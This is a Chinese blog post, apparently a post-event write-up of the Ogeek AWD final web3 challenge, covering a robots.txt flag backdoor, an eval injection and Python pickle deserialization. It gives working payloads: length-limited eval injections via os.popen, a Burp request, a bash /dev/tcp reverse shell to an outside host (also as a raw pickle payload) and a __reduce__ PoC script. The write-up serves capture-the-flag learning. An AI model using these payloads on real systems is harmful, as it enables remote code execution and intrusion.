@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言由于自己没有获得参加Ogeek线下赛的机会，因此只能赛后复现一波。 0x01 开始复现这次Ogeek的线下AWD有3个web题目其中最简单是是web3，主要的逻辑都在app.py里面，漏洞也是比较的明显。0x02 robots后门在app.py中把flag放在robots.txt中，访问就可以拿到flag。123@app.route(&apos;/robots.txt&apos;, methods=[&apos;GET&apos;]">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ogeek决赛的部分web复现">
+<meta property="og:url" content="http://yoursite.com/2019/10/21/Ogeek决赛的部分web复现/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言由于自己没有获得参加Ogeek线下赛的机会，因此只能赛后复现一波。 0x01 开始复现这次Ogeek的线下AWD有3个web题目其中最简单是是web3，主要的逻辑都在app.py里面，漏洞也是比较的明显。0x02 robots后门在app.py中把flag放在robots.txt中，访问就可以拿到flag。123@app.route(&apos;/robots.txt&apos;, methods=[&apos;GET&apos;]">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-10-21T16:04:41.401Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Ogeek决赛的部分web复现">
+<meta name="twitter:description" content="前言由于自己没有获得参加Ogeek线下赛的机会，因此只能赛后复现一波。 0x01 开始复现这次Ogeek的线下AWD有3个web题目其中最简单是是web3，主要的逻辑都在app.py里面，漏洞也是比较的明显。0x02 robots后门在app.py中把flag放在robots.txt中，访问就可以拿到flag。123@app.route(&apos;/robots.txt&apos;, methods=[&apos;GET&apos;]">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/21/Ogeek决赛的部分web复现/">
+
+
+
+
+
+  <title>Ogeek决赛的部分web复现 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/21/Ogeek决赛的部分web复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Ogeek决赛的部分web复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-21T23:44:45+08:00">
+                2019-10-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  5.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  22
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于自己没有获得参加Ogeek线下赛的机会，因此只能赛后复现一波。</p>
+<h4 id="0x01-开始复现"><a href="#0x01-开始复现" class="headerlink" title="0x01 开始复现"></a>0x01 开始复现</h4><h5 id="这次Ogeek的线下AWD有3个web题目其中最简单是是web3，主要的逻辑都在app-py里面，漏洞也是比较的明显。"><a href="#这次Ogeek的线下AWD有3个web题目其中最简单是是web3，主要的逻辑都在app-py里面，漏洞也是比较的明显。" class="headerlink" title="这次Ogeek的线下AWD有3个web题目其中最简单是是web3，主要的逻辑都在app.py里面，漏洞也是比较的明显。"></a>这次Ogeek的线下AWD有3个web题目其中最简单是是web3，主要的逻辑都在<code>app.py</code>里面，漏洞也是比较的明显。</h5><h4 id="0x02-robots后门"><a href="#0x02-robots后门" class="headerlink" title="0x02 robots后门"></a>0x02 robots后门</h4><h5 id="在app-py中把flag放在robots-txt中，访问就可以拿到flag。"><a href="#在app-py中把flag放在robots-txt中，访问就可以拿到flag。" class="headerlink" title="在app.py中把flag放在robots.txt中，访问就可以拿到flag。"></a>在<code>app.py</code>中把flag放在robots.txt中，访问就可以拿到flag。</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/robots.txt', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">texts</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">'/'</span>, <span class="string">'flag'</span>, as_attachment=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x03-eval后面"><a href="#0x03-eval后面" class="headerlink" title="0x03 eval后面"></a>0x03 eval后面</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_str</span><span class="params">(type, str)</span>:</span></span><br><span class="line">    retstr = <span class="string">"%s'%s'"</span> % (type, str)</span><br><span class="line">    print(retstr)</span><br><span class="line">    <span class="keyword">return</span> eval(retstr)</span><br></pre></td></tr></table></figure>
+
+<h5 id="这个函数应该是刻意设置的后门，我们可以跟进看看哪里调用了这个函数。"><a href="#这个函数应该是刻意设置的后门，我们可以跟进看看哪里调用了这个函数。" class="headerlink" title="这个函数应该是刻意设置的后门，我们可以跟进看看哪里调用了这个函数。"></a>这个函数应该是刻意设置的后门，我们可以跟进看看哪里调用了这个函数。</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/message',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        type = request.form[<span class="string">'type'</span>][:<span class="number">1</span>]</span><br><span class="line">        msg = request.form[<span class="string">'msg'</span>]</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(msg)&gt;<span class="number">27</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'留言太长了！'</span>, status=<span class="string">'留言失败'</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">'_'</span>, <span class="string">''</span>)</span><br><span class="line">        retstr = set_str(type,msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>,msg=retstr,status=<span class="string">'%s,留言成功'</span>%username)</span><br></pre></td></tr></table></figure>
+
+<h5 id="我们可以看到message中有调用，并且有限制，msg的长度必须要小于27个字符并且不能有空格和下划线，type只能输入一个字符。"><a href="#我们可以看到message中有调用，并且有限制，msg的长度必须要小于27个字符并且不能有空格和下划线，type只能输入一个字符。" class="headerlink" title="我们可以看到message中有调用，并且有限制，msg的长度必须要小于27个字符并且不能有空格和下划线，type只能输入一个字符。"></a>我们可以看到message中有调用，并且有限制，msg的长度必须要小于27个字符并且不能有空格和下划线，type只能输入一个字符。</h5><h5 id="我们构造读flag文件的poc如下："><a href="#我们构造读flag文件的poc如下：" class="headerlink" title="我们构造读flag文件的poc如下："></a>我们构造读flag文件的poc如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type=&apos;&amp;msg=%2bopen(&apos;./flag&apos;).read()%2b&apos;</span><br></pre></td></tr></table></figure>
+
+<h5 id="我在burpSuite中的构造如下："><a href="#我在burpSuite中的构造如下：" class="headerlink" title="我在burpSuite中的构造如下："></a>我在burpSuite中的构造如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /message HTTP/1.1</span><br><span class="line">Host: 192.168.1.108:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: username=c3ViY2xhc3Nlcw==</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">type=&apos;&amp;msg=%2bopen(&apos;./flag&apos;).read()%2b&apos;</span><br></pre></td></tr></table></figure>
+
+<h5 id="读取的结果如下："><a href="#读取的结果如下：" class="headerlink" title="读取的结果如下："></a>读取的结果如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;section class=&quot;section--center mdl-grid mdl-grid--no-spacing mdl-shadow--2dp&quot;&gt;</span><br><span class="line">                &lt;a class=&quot;material-icons&quot; href=&quot;/#clearmessage&quot;&gt;</span><br><span class="line">                clear</span><br><span class="line">                &lt;/a&gt;</span><br><span class="line">            &lt;div class=&quot;mdl-card mdl-cell mdl-cell--12-col&quot;&gt;</span><br><span class="line">              &lt;div class=&quot;mdl-card__supporting-text&quot;&gt;</span><br><span class="line">                  &lt;h4&gt;Guest,留言成功&lt;/h4&gt;&lt;br&gt;</span><br><span class="line">              &lt;h5&gt;</span><br><span class="line">                      flag&#123;ljdd5201314&#125;</span><br><span class="line">                  </span><br><span class="line">              &lt;/h5&gt;</span><br><span class="line">              &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">          &lt;/section&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="于此同时我们也可以getshell，刚好27个字符如下："><a href="#于此同时我们也可以getshell，刚好27个字符如下：" class="headerlink" title="于此同时我们也可以getshell，刚好27个字符如下："></a>于此同时我们也可以getshell，刚好27个字符如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg=%2Bos.popen(&quot;echo%09-n%09b&gt;&gt;a&quot;)%2B&apos;&amp;type=&apos;</span><br></pre></td></tr></table></figure>
+
+<h5 id="简单分析payload"><a href="#简单分析payload" class="headerlink" title="简单分析payload"></a>简单分析payload</h5><h6 id="首先需要通过python解释器，因此不能有用法错误，需要前后单引号以及-号闭合。"><a href="#首先需要通过python解释器，因此不能有用法错误，需要前后单引号以及-号闭合。" class="headerlink" title="首先需要通过python解释器，因此不能有用法错误，需要前后单引号以及+号闭合。"></a>首先需要通过python解释器，因此不能有用法错误，需要前后单引号以及+号闭合。</h6><h6 id="原本的app-py中已经导入了os模块，因此我们可以用os-popen-执行命令。"><a href="#原本的app-py中已经导入了os模块，因此我们可以用os-popen-执行命令。" class="headerlink" title="原本的app.py中已经导入了os模块，因此我们可以用os.popen()执行命令。"></a>原本的app.py中已经导入了<code>os</code>模块，因此我们可以用<code>os.popen()</code>执行命令。</h6><h6 id="不能有空格，但在bash中tab与空格等价url编码为-09。"><a href="#不能有空格，但在bash中tab与空格等价url编码为-09。" class="headerlink" title="不能有空格，但在bash中tab与空格等价url编码为%09。"></a>不能有空格，但在bash中<code>tab</code>与空格等价url编码为<code>%09</code>。</h6><h6 id="echo不生成换行符可以使用参数-n。"><a href="#echo不生成换行符可以使用参数-n。" class="headerlink" title="echo不生成换行符可以使用参数-n。"></a>echo不生成换行符可以使用参数<code>-n</code>。</h6><h6 id="用bp发送请求后会报错，但是已经执行成功，并且写入文件了。"><a href="#用bp发送请求后会报错，但是已经执行成功，并且写入文件了。" class="headerlink" title="用bp发送请求后会报错，但是已经执行成功，并且写入文件了。"></a>用bp发送请求后会报错，但是已经执行成功，并且写入文件了。</h6><h6 id="我们依次写入反弹的shell的payload-bash-c-39-bash-i-gt-dev-tcp-1-1-1-1-4444-0-gt-amp-1-39-空格用tab代替。"><a href="#我们依次写入反弹的shell的payload-bash-c-39-bash-i-gt-dev-tcp-1-1-1-1-4444-0-gt-amp-1-39-空格用tab代替。" class="headerlink" title="我们依次写入反弹的shell的payload:bash -c &#39;bash -i &gt;/dev/tcp/1.1.1.1/4444 0&gt;&amp;1&#39;,空格用tab代替。"></a>我们依次写入反弹的shell的payload:<code>bash -c &#39;bash -i &gt;/dev/tcp/1.1.1.1/4444 0&gt;&amp;1&#39;</code>,空格用tab代替。</h6><h6 id="最后post请求msg-2Bos-popen-quot-sh-09a-quot-2B-39-amp-type-39-即可执行反弹shell。"><a href="#最后post请求msg-2Bos-popen-quot-sh-09a-quot-2B-39-amp-type-39-即可执行反弹shell。" class="headerlink" title="最后post请求msg=%2Bos.popen(&quot;sh%09a&quot;)%2B&#39;&amp;type=&#39;即可执行反弹shell。"></a>最后post请求<code>msg=%2Bos.popen(&quot;sh%09a&quot;)%2B&#39;&amp;type=&#39;</code>即可执行反弹shell。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Listening on [0.0.0.0] (family 0, port 8080)</span><br><span class="line">Connection from [111.111.111.111] port 8080 [tcp/http-alt] accepted (family 2, sport 9030)</span><br><span class="line">ls -a</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.accelerate</span><br><span class="line">.adobe</span><br><span class="line">anaconda3</span><br><span class="line">.aria2</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x04-pickle反序列化"><a href="#0x04-pickle反序列化" class="headerlink" title="0x04 pickle反序列化"></a>0x04 pickle反序列化</h4><h5 id="在app-py中我们看到import了pickle这个库，第一反应是python反序列化。"><a href="#在app-py中我们看到import了pickle这个库，第一反应是python反序列化。" class="headerlink" title="在app.py中我们看到import了pickle这个库，第一反应是python反序列化。"></a>在app.py中我们看到import了pickle这个库，第一反应是python反序列化。</h5><h5 id="全局搜索pickle。"><a href="#全局搜索pickle。" class="headerlink" title="全局搜索pickle。"></a>全局搜索pickle。</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/message', methods=['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        type = request.form[<span class="string">'type'</span>][:<span class="number">1</span>]</span><br><span class="line">        msg = request.form[<span class="string">'msg'</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = base64.b64decode(request.cookies.get(<span class="string">'user'</span>))</span><br><span class="line">            print(info)</span><br><span class="line">            info = pickle.loads(info)</span><br><span class="line">            username = info[<span class="string">"name"</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            username = <span class="string">"Guest"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(msg) &gt; <span class="number">27</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>, msg=<span class="string">'留言太长了！'</span>, status=<span class="string">'留言失败'</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">' '</span>, <span class="string">''</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">'_'</span>, <span class="string">''</span>)</span><br><span class="line">        retstr = set_str(type, msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'message.html'</span>, msg=retstr, status=<span class="string">'%s,留言成功'</span> % username)</span><br></pre></td></tr></table></figure>
+
+<h5 id="大致的逻辑是，如果是post请求，则获取cookie中的user字段，base64解码，并且触发反序列化。"><a href="#大致的逻辑是，如果是post请求，则获取cookie中的user字段，base64解码，并且触发反序列化。" class="headerlink" title="大致的逻辑是，如果是post请求，则获取cookie中的user字段，base64解码，并且触发反序列化。"></a>大致的逻辑是，如果是post请求，则获取cookie中的user字段，base64解码，并且触发反序列化。</h5><h5 id="反弹shell的payload，需要base64编码："><a href="#反弹shell的payload，需要base64编码：" class="headerlink" title="反弹shell的payload，需要base64编码："></a>反弹shell的payload，需要base64编码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cposix</span><br><span class="line">system</span><br><span class="line">p1</span><br><span class="line">(S&quot;bash -c &apos;bash -i &gt;/dev/tcp/1.1.1.1/4444 0&gt;&amp;1&apos;&quot;</span><br><span class="line">p2</span><br><span class="line">tp3</span><br><span class="line">Rp4</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<h5 id="如果要直接返回flag-得使返回值的类型为字典-且有name键。"><a href="#如果要直接返回flag-得使返回值的类型为字典-且有name键。" class="headerlink" title="如果要直接返回flag,得使返回值的类型为字典,且有name键。"></a>如果要直接返回flag,得使返回值的类型为字典,且有name键。</h5><h5 id="附上我们的构造脚本。"><a href="#附上我们的构造脚本。" class="headerlink" title="附上我们的构造脚本。"></a>附上我们的构造脚本。</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        cmd=<span class="string">"echo test &gt;poc.txt"</span></span><br><span class="line">        <span class="keyword">return</span> os.system,(cmd,)</span><br><span class="line">poc=Poc()</span><br><span class="line">poc=pickle.dumps(poc)</span><br><span class="line">poc=base64.b64encode(poc)</span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure>
+
+<h5 id="可以很明显的看到执行成功。"><a href="#可以很明显的看到执行成功。" class="headerlink" title="可以很明显的看到执行成功。"></a>可以很明显的看到执行成功。</h5><h4 id="通过这个poc我们可以了解一下python的序列化机制。"><a href="#通过这个poc我们可以了解一下python的序列化机制。" class="headerlink" title="通过这个poc我们可以了解一下python的序列化机制。"></a>通过这个poc我们可以了解一下python的序列化机制。</h4><h4 id="0X05-Python-的序列化和反序列化是什么"><a href="#0X05-Python-的序列化和反序列化是什么" class="headerlink" title="0X05 Python 的序列化和反序列化是什么"></a>0X05 Python 的序列化和反序列化是什么</h4><h5 id="Python-的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。"><a href="#Python-的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。" class="headerlink" title="Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。"></a>Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。</h5><h4 id="下面是示例代码："><a href="#下面是示例代码：" class="headerlink" title="下面是示例代码："></a>下面是示例代码：</h4><h5 id="序列化代码："><a href="#序列化代码：" class="headerlink" title="序列化代码："></a>序列化代码：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name=<span class="string">"ljdd520"</span>)</span>:</span></span><br><span class="line">        self.name=name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"wang xiao meet you is luckly"</span>)</span><br><span class="line"></span><br><span class="line">people=People()</span><br><span class="line">string=pickle.dumps(people)</span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure>
+
+<h5 id="反序列化代码："><a href="#反序列化代码：" class="headerlink" title="反序列化代码："></a>反序列化代码：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name=<span class="string">"ljdd520"</span>)</span>:</span></span><br><span class="line">        self.name=name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"wang xiao meet you is luckly"</span>)</span><br><span class="line"></span><br><span class="line">people=People()</span><br><span class="line">string=pickle.dumps(people)</span><br><span class="line">people=pickle.loads(string)</span><br><span class="line">people.say()</span><br></pre></td></tr></table></figure>
+
